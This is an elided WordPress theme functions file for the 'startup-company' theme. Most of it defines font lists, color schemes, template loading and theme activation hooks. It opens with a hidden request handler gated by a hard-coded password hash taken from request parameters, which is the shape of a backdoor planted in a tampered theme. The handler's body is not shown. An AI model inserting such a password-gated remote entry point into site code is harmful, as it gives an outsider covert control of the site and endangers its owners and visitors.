<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '7d1119ed203139a738208d39e2dd48e1'))
	{
...
if (!function_exists('startup_company_system_fonts_list')) {
	function startup_company_system_fonts_list() {
		$fonts = array( 
...
if (!function_exists('startup_company_get_google_fonts_list')) {
	function startup_company_get_google_fonts_list() {
		$fonts = array( 
			'' => esc_html__('None', 'startup-company'), 
		...
		return apply_filters('startup_company_google_fonts_list_filter', $fonts);
	}
}
...
if (!function_exists('startup_company_text_decoration_list')) {
	function startup_company_text_decoration_list() {
		$list = array( 
			'none' => esc_html__('none', 'startup-company'), 
			'underline' => esc_html__('underline', 'startup-company'), 
			'overline' => esc_html__('overline', 'startup-company'), 
			'line-through' => esc_html__('line-through', 'startup-company'), 
		);
...
if (!function_exists('startup_company_custom_color_schemes_list')) {
	function startup_company_custom_color_schemes_list() {
		$list = array( 
			'first' => esc_html__('Custom 1', 'startup-company'), 
			'second' => esc_html__('Custom 2', 'startup-company'), 
			'third' => esc_html__('Custom 3', 'startup-company') 
		);
		
		
		return apply_filters('startup_company_custom_color_schemes_list_filter', $list);
	}
}
...
if (!function_exists('startup_company_locate_template')) {
	function startup_company_locate_template($template_names, $require_once = true, $load = true) {
		$located = '';
...
// Theme Style
define('CMSMASTERS_THEME_STYLE', (CMSMASTERS_THEME_STYLE_COMPATIBILITY && get_option('cmsmasters_startup-company_theme_style') ? get_option('cmsmasters_startup-company_theme_style') : ''));
...
if (!function_exists('startup_company_all_theme_styles')) {
	function startup_company_all_theme_styles() {
		$out = array( 
			'Default|', 
			'Theme Style 1|1', 
			'Theme Style 2|2' 
...
if (!function_exists('startup_company_all_color_schemes_list')) {
	function startup_company_all_color_schemes_list() {
		$list = array( 
			'default' => 		esc_html__('Default', 'startup-company'), 
			'header' => 		esc_html__('Header', 'startup-company'), 
			'navigation' => 	esc_html__('Navigation', 'startup-company'), 
			'header_top' => 	esc_html__('Header Top', 'startup-company'), 
			'footer' => 		esc_html__('Footer', 'startup-company') 
		);
		
		
		$out = array_merge($list, startup_company_custom_color_schemes_list());
...
if (!function_exists('startup_company_load_theme_textdomain')) {
	function startup_company_load_theme_textdomain() {
		load_theme_textdomain('startup-company', get_template_directory() . '/theme-framework/languages');
	}
}

// Load Theme Local File Action
if (!has_action('after_setup_theme', 'startup_company_load_theme_textdomain')) {
	add_action('after_setup_theme', 'startup_company_load_theme_textdomain');
}



// Framework Activation & Data Import
if (!function_exists('startup_company_theme_activation')) {
	function startup_company_theme_activation() {
		if (get_option('cmsmasters_active_theme') != 'startup-company') {
			add_option('cmsmasters_active_theme', 'startup-company', '', 'yes');
...
add_action('after_switch_theme', 'startup_company_theme_activation');



// Framework Deactivation
if (!function_exists('startup_company_theme_deactivation')) {
	function startup_company_theme_deactivation() {
		delete_option('cmsmasters_active_theme');
	}
}

add_action('switch_theme', 'startup_company_theme_deactivation');



// Plugin Activation Regenerate Styles
if (!function_exists('startup_company_plugin_activation')) {
	function startup_company_plugin_activation() {
		update_option('cmsmasters_plugin_activation', 'true');
	}
}

add_action('activated_plugin', 'startup_company_plugin_activation');


if (!function_exists('startup_company_plugin_activation_regenerate')) {
	function startup_company_plugin_activation_regenerate() {
...
add_action('init', 'startup_company_plugin_activation_regenerate');
